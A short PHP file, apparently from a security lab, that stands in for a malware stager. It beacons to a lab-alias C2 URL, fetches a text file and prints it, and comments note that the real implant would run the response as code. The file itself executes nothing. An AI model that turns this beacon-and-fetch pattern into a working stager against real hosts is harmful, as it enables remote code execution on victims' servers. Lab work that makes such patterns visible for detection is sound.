<?php
/**
 * NEUTERED LAB STAND-IN for the remote stager.
 *
 * The real implant fetches an off-host payload and runs it. This stand-in fetches
 * from the LOCAL lab sink and PRINTS what it received. It never executes anything:
 * there is deliberately no eval, no include, no assert of the response. Its only
 * purpose is to make the beacon/fetch pattern visible in the sink logs.
 */
$c2 = 'http://c2.lab:8080/door/lab.txt';         // local sink alias, never the real C2
$body = @file_get_contents($c2);
header('Content-Type: text/plain');
echo "Lab stager: fetched from the local sink, executed nothing.\n";
echo "Sink returned: " . ($body === false ? "(unreachable)" : trim($body)) . "\n";
// The real implant would run the response as code. The lab intentionally does not.
